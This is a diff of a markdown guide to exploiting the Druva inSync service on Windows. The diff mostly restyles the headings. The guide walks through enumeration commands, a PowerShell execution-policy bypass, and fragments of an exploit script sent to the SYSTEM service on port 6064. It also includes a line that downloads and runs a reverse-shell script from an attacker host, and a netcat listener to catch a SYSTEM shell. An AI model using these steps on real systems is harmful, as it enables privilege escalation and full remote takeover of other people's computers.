@@ -1,18 +1,18 @@
-# Vulnerable Services (Druva inSync).md
+# <span style="color:#FF5555">Vulnerable Services (Druva inSync).md</span>
 
 Sometimes, Windows computers have programs running that have security bugs. One such program is Druva inSync, which runs with very high privileges (SYSTEM user).
 
 If this program is installed and running, we can send it special commands to get full control of the computer.
 
-### Steps and Commands to Exploit Druva inSync Vulnerability
-#### 1. Check Installed Programs on Target
+### <span style="color:#50FA7B">Steps and Commands to Exploit Druva inSync Vulnerability</span>
+#### <span style="color:#FFB86C">1. Check Installed Programs on Target</span>
 Open Command Prompt or PowerShell on the target machine and run:
 ```
 wmic product get name
 ```
 Look for Druva inSync in the output.
 
-#### 2. Check if Druva Service is Running and Listening on Port 6064
+#### <span style="color:#FFB86C">2. Check if Druva Service is Running and Listening on Port 6064</span>
 Run this to find if port 6064 is open:
 ```
 netstat -ano | findstr 6064
@@ -29,7 +29,7 @@ Check if the Druva service is running:
 get-service | ? {$_.DisplayName -like 'Druva*'}
 ```
 
-#### 3. Run PowerShell Exploit Script on Target
+#### <span style="color:#FFB86C">3. Run PowerShell Exploit Script on Target</span>
 Open PowerShell as administrator and allow script execution temporarily:
 ```
 Set-ExecutionPolicy Bypass -Scope Process
@@ -60,7 +60,7 @@ $s.Send($length)
 $s.Send($command)
 ```
 
-#### 4. (Optional) Use Reverse Shell Instead of Adding a User
+#### <span style="color:#FFB86C">4. (Optional) Use Reverse Shell Instead of Adding a User</span>
 Prepare a PowerShell reverse shell script shell.ps1 on your attacker machine.
 
 Start a Python HTTP server in the folder containing shell.ps1:
@@ -70,14 +70,14 @@ python3 -m http.server 8080
 
 Modify $cmd in the exploit script on the target:
 ```
-$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<YOUR-IP>:8080/shell.ps1')"
+$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://$ATTACKER_IP:8080/shell.ps1')"
 ```
-Replace <YOUR-IP> with your attack machine IP.
+Replace $ATTACKER_IP with your attack machine IP.
 
-#### 5. Start Netcat Listener on Attacker Machine
+#### <span style="color:#FFB86C">5. Start Netcat Listener on Attacker Machine</span>
 ```
 nc -lvnp 9443
 ```
 
-### 6. Run the Exploit Script on the Target
+### <span style="color:#50FA7B">6. Run the Exploit Script on the Target</span>
 After running the PowerShell exploit, you should receive a shell running as SYSTEM on the target machine.
